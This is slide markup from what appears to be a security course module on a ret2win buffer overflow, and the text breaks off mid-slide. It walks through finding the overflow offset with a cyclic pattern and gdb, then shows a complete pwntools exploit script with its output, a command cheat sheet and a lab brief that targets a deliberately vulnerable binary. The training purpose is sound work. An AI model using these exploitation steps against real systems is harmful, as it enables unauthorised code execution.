                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ pwn cyclic 100</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aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaap...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>(gdb) run   # paste the pattern as input, then let it crash</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(gdb) x/gx $rsp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>0x7fffffffec18: 0x6161617461616173</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ pwn cyclic -l 0x6161617461616173</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>72</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4650581"/>
            <a:ext cx="10881360" cy="1567339"/>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Every 8-byte window of a cyclic pattern is unique, so any fragment of it identifies exactly where in the pattern it came from</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On x86-64, jumping to a non-canonical address faults AT the ret instruction, not at the destination — read the corrupted value directly off the stack with x/gx $rsp instead of trusting $rip</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The offset (72 here: a 64-byte buffer plus an 8-byte saved base pointer) is now known precisely, not guessed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10"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8 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11"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The ret2win Technique</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The setup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The target binary has a complete, callable function (often named win()) that grants access — but nothing in the program's normal flow ever calls it.</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The payload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Padding bytes to fill exactly up to the return address, followed by win()'s real address instead of the correct one.</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What happens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When the vulnerable function tries to return normally, it "returns" straight into win() instead — code that already exists in the binary, just never reachable through normal execution.</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Why no injected shellcode is needed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You're redirecting execution to code the binary already contains — which is exactly why this technique still works even with NX (non-executable stack) enabled.</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Why "ret2win"</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Short for "return to win" — you're not injecting anything new, just changing where an existing return instruction sends you.</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8 · Phase 3: Gaining Access</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THE EXPLOIT · PUTTING IT ALL TOGETHER</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From Offset and Address to a Working Payload</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1508760"/>
            <a:ext cx="10881360" cy="2820035"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1946"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0B1220"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1709928"/>
            <a:ext cx="146304" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF4444"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1170432" y="1709928"/>
            <a:ext cx="146304" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F59E0B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1426464" y="1709928"/>
            <a:ext cx="146304" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10B981"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2011680"/>
            <a:ext cx="10332720" cy="2179955"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ python3 -c "from pwn import *; print(hex(ELF('./vuln').symbols['win']))"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>0x4011d6</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t># exploit.py</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>exe = ELF('./vuln')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>io = remote('target', 9999)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>payload = b'A' * 72 + p64(exe.symbols['win'])</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>io.send(payload)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>=== ACCESS GRANTED ===</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4603115"/>
            <a:ext cx="10881360" cy="1614805"/>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ELF(...).symbols['win'] reads the address directly from the binary — no manual lookup or guessing required</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72 bytes of padding (from the cyclic offset) plus 8 bytes for the address (p64 packs it in the right byte order)</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The moment the vulnerable function returns, execution jumps straight into win() instead of back to main()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10"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8 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11"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REFERENCE</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Protections, and What Defeats Each One</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2103120"/>
                <a:gridCol w="4206240"/>
                <a:gridCol w="4572000"/>
              </a:tblGrid>
              <a:tr h="457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="F8FAFC"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Protection</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Defends against</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Why ret2win still works here</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Stack canary</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Detecting a corrupted return address before use</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Disabled for this exercise — a real target would abort before returning</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NX</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Executing injected shellcode on the stack</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Not needed — ret2win reuses code the binary already contains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PIE</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Predicting a function's address across runs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Disabled — win()'s address is identical every single run</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5943600"/>
            <a:ext cx="10881360" cy="36576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All three off is what makes this a fair "learn the technique" exercise — a hardened real target would require defeating some or all of them first.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 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8 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>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COMMON PITFALLS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="841248"/>
            <a:ext cx="10058400" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Mistakes That Cost Marks — and Time</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1828800"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>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234440" y="178308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Trusting $rip alone after a crash</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="211226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 jump to a non-canonical address faults at the ret instruction itself — read the real target off the stack with x/gx $rsp instead.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2697480"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>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234440" y="265176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Guessing the offset instead of using a cyclic pattern</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="298094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Sending "AAAA..." and counting by eye is unreliable and does not scale to real exploit development.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3566160"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>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03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="352044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Forgetting p64() for the address</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="384962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 raw Python integer is not the same as 8 correctly-ordered bytes — pack it properly or the payload is silently wrong.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4434840"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>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04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="438912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Assuming every overflow needs shellcode</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="471830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ret2win specifically avoids that requirement by jumping to code that already exists in the binary.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5303520"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="530352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05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="525780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Losing track of exactly what protections are enabled</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="558698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Always run checksec first — the technique that works depends entirely on what's actually turned on.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="115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8 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>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QUICK REFERENCE</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Command Cheat Sheet</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6035040"/>
                <a:gridCol w="4846320"/>
              </a:tblGrid>
              <a:tr h="457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="F8FAFC"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Command</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What it does</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pwn checksec ./binary</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Report a binary's memory protections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pwn cyclic 100</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Generate a 100-byte unique pattern</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pwn cyclic -l &lt;value&gt;</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Look up the offset a captured pattern value corresponds to</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python3 -c "from pwn import *; print(hex(ELF('./bin').symbols['fn']))"</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Read a function's address from the binary</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payload = b'A' * offset + p64(target_addr)</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Build a ret2win payload</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8 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>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HANDS-ON LAB · 2–2.5 HOURS</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Lab 8: Exploit Development (Buffer Overflow)</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Environment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pre-built vulnerable binary, identical on both your local analysis copy and the live remote target.</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1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Read the vulnerable source and confirm initial access to the target host via SSH.</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2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Run checksec and connect each finding to a specific protection you learned about today.</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3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Generate a cyclic pattern, crash the program under gdb, and determine the exact offset.</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4-5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Find win()'s address with pwntools, build the payload, and fire it at the live service.</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Optional CTF</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A user flag from initial SSH access, and a second flag printed directly by win() the moment your exploit succeeds — that flag is your proof of working code execution.</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8 · Phase 3: Gaining Access</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KNOWLEDGE CHECK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="841248"/>
            <a:ext cx="10058400" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Test Yourself Before the Lab</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1691640"/>
            <a:ext cx="5257800" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2609"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
